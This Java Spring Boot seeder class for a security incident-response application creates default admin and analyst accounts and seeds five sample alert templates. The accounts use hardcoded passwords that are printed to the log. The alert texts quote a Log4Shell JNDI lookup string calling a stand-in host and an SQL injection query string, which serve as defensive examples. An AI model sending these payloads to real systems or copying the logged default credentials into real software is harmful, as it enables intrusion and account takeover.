package com.cybersecurity.responder.config;

import com.cybersecurity.responder.entity.PredefinedAlert;
import com.cybersecurity.responder.entity.Role;
import com.cybersecurity.responder.entity.Severity;
import com.cybersecurity.responder.entity.User;
import com.cybersecurity.responder.repository.PredefinedAlertRepository;
import com.cybersecurity.responder.repository.UserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.List;

@Component
public class DatabaseSeeder implements CommandLineRunner {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PredefinedAlertRepository predefinedAlertRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Override
    public void run(String... args) throws Exception {
        seedUsers();
        seedPredefinedAlerts();
    }

    private void seedUsers() {
        if (userRepository.count() == 0) {
            // Seed a default admin
            User admin = new User(
                    "admin@responder.com",
                    passwordEncoder.encode("admin123"),
                    "Security Admin",
                    Role.ROLE_ADMIN
            );
            userRepository.save(admin);
            System.out.println("[DB SEEDER] Created default admin account: admin@responder.com / admin123");

            // Seed a default analyst
            User analyst = new User(
                    "analyst@responder.com",
                    passwordEncoder.encode("analyst123"),
                    "SOC Analyst Alpha",
                    Role.ROLE_ANALYST
            );
            userRepository.save(analyst);
            System.out.println("[DB SEEDER] Created default analyst account: analyst@responder.com / analyst123");
        }
    }

    private void seedPredefinedAlerts() {
        if (predefinedAlertRepository.count() == 0) {
            List<PredefinedAlert> templates = Arrays.asList(
                    new PredefinedAlert(
                            "Log4Shell LDAP RCE Attempt",
                            "External IP 185.220.101.5 submitted request payload with pattern '${jndi:ldap://badhost.io/a}' in User-Agent header targeting main web server log4j parser.",
                            Severity.CRITICAL,
                            "Remote Code Execution"
                    ),
                    new PredefinedAlert(
                            "SQL Injection Payload Detected",
                            "WAF intercepted suspect query string parameter on endpoint '/api/products/search?q=1%20OR%201%3D1%20--'. Payload attempts database structure lookup.",
                            Severity.HIGH,
                            "SQL Injection"
                    ),
                    new PredefinedAlert(
                            "TCP SYN Flood Traffic Spike",
                            "Network firewall reports incoming rate of TCP SYN packets from single subnet reaching 50,000 packets/sec on port 443. Web service response times degraded.",
                            Severity.HIGH,
                            "DDoS Attack"
                    ),
                    new PredefinedAlert(
                            "SSH Login Brute Force Campaign",
                            "Auth log monitoring daemon detected 45 failed login attempts for user 'root' from source IP 192.168.1.150 over port 22 in a 60-second window.",
                            Severity.MEDIUM,
                            "Brute Force"
                    ),
                    new PredefinedAlert(
                            "Ransomware Encryption Signature",
                            "Endpoint Detection and Response (EDR) agent reported high-speed renaming of user files to '.locked' extension and creation of 'README.txt' ransom files on file server.",
                            Severity.CRITICAL,
                            "Ransomware"
                    )
            );
            predefinedAlertRepository.saveAll(templates);
            System.out.println("[DB SEEDER] Seeded 5 predefined cybersecurity alert templates.");
        }
    }
}
